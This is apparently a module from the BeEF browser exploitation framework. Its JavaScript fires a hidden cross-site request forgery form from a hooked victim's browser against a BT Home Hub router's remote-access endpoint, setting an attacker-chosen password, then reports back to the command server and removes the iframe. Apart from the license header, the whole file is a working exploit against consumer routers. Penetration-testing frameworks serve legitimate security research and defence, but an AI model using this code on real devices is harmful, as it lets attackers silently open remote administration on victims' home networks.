//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
  var gateway = '<%= @base %>'; 
  var passwd = '<%= @password %>';



  var bt_home_hub_iframe = beef.dom.createIframeXsrfForm(gateway + "/cgi/b/ras//?ce=1&be=1&l0=5&l1=5", "POST",
      [{'type':'hidden', 'name':'0', 'value':'31'} ,
       {'type':'hidden', 'name':'1', 'value':''},
       {'type':'hidden', 'name':'30', 'value':passwd}]);

  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");

  cleanup = function() {
    document.body.removeChild(bt_home_hub_iframe);
  }
  setTimeout("cleanup()", 15000);

});

